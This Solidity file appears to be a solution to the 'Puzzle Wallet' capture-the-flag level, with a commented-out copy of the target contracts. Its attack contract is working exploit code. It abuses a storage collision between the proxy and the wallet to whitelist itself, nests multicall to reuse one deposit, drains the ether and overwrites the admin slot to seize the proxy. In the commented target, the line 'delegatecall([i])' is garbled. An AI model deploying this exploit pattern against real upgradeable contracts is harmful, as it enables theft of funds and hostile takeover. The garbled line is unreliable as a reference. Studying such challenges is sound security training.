// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

/* get PuzzleProxy ownership */
/* contract eth balance must be 0 (currently 0.001 ether) */
/* Implementation conotract storage variables order must be same as Proxy contract */
contract PuzzleProxyHack {
    constructor(IPuzzleProxy PuzzleProxyC) payable {
        /*  */
        /* STEP 1_ pass "onlyWhitelisted" modifier */
        PuzzleProxyC.proposeNewAdmin(address(this));
        PuzzleProxyC.addToWhitelist(address(this));

        /*  */
        /* STEP 2_ Set PuzzleProxy's ETh to 0*/
        /* get selectors bytes */
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(PuzzleProxyC.deposit.selector);

        bytes[] memory multicall_reentrance_data = new bytes[](2);
        // deposit
        multicall_reentrance_data[0] = deposit_data[0];
        // multicall -> deposit
        multicall_reentrance_data[1] = abi.encodeWithSelector(
            PuzzleProxyC.multicall.selector,
            deposit_data
        );

        /* call deposit twice, hack-duplicate balance */
        PuzzleProxyC.multicall{value: 0.001 ether}(multicall_reentrance_data);

        // withdraw
        PuzzleProxyC.execute(msg.sender, 0.002 ether, "");

        /*  */
        /* STEP 3_ become the admin of the proxy */
        uint256 adminAddrCasted = uint(uint160(msg.sender));
        PuzzleProxyC.setMaxBalance(adminAddrCasted);

        require(PuzzleProxyC.admin() == msg.sender, "failed");
        selfdestruct(payable(msg.sender));
    }
}

interface IPuzzleProxy {
    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

// import "../helpers/UpgradeableProxy-08.sol";

// contract PuzzleProxy is UpgradeableProxy {
//     address public pendingAdmin;
//     address public admin;

//     constructor(
//         address _admin,
//         address _implementation,
//         bytes memory _initData
//     ) UpgradeableProxy(_implementation, _initData) {
//         admin = _admin;
//     }

//     modifier onlyAdmin() {
//         require(msg.sender == admin, "Caller is not the admin");
//         _;
//     }

//     function proposeNewAdmin(address _newAdmin) external {
//         pendingAdmin = _newAdmin;
//     }

//     function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
//         require(
//             pendingAdmin == _expectedAdmin,
//             "Expected new admin by the current admin is not the pending admin"
//         );
//         admin = pendingAdmin;
//     }

//     function upgradeTo(address _newImplementation) external onlyAdmin {
//         _upgradeTo(_newImplementation);
//     }
// }

// contract PuzzleWallet {
//     address public owner;
//     uint256 public maxBalance;
//     mapping(address => bool) public whitelisted;
//     mapping(address => uint256) public balances;

//     function init(uint256 _maxBalance) public {
//         require(maxBalance == 0, "Already initialized");
//         maxBalance = _maxBalance;
//         owner = msg.sender;
//     }

//     modifier onlyWhitelisted() {
//         require(whitelisted[msg.sender], "Not whitelisted");
//         _;
//     }

//     function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
//         require(address(this).balance == 0, "Contract balance is not 0");
//         maxBalance = _maxBalance;
//     }

//     function addToWhitelist(address addr) external {
//         require(msg.sender == owner, "Not the owner");
//         whitelisted[addr] = true;
//     }

//     function deposit() external payable onlyWhitelisted {
//         require(address(this).balance <= maxBalance, "Max balance reached");
//         balances[msg.sender] += msg.value;
//     }

//     function execute(
//         address to,
//         uint256 value,
//         bytes calldata data
//     ) external payable onlyWhitelisted {
//         require(balances[msg.sender] >= value, "Insufficient balance");
//         balances[msg.sender] -= value;
//         (bool success, ) = to.call{value: value}(data);
//         require(success, "Execution failed");
//     }

//     function multicall(bytes[] calldata data) external payable onlyWhitelisted {
//         bool depositCalled = false;
//         for (uint256 i = 0; i < data.length; i++) {
//             bytes memory _data = data[i];
//             bytes4 selector;
//             assembly {
//                 selector := mload(add(_data, 32))
//             }
//             if (selector == this.deposit.selector) {
//                 require(!depositCalled, "Deposit can only be called once");
//                 // Protect against reusing msg.value
//                 depositCalled = true;
//             }
//             (bool success, ) = address(this).delegatecall([i]);
//             require(success, "Error while delegating call");
//         }
//     }
// }
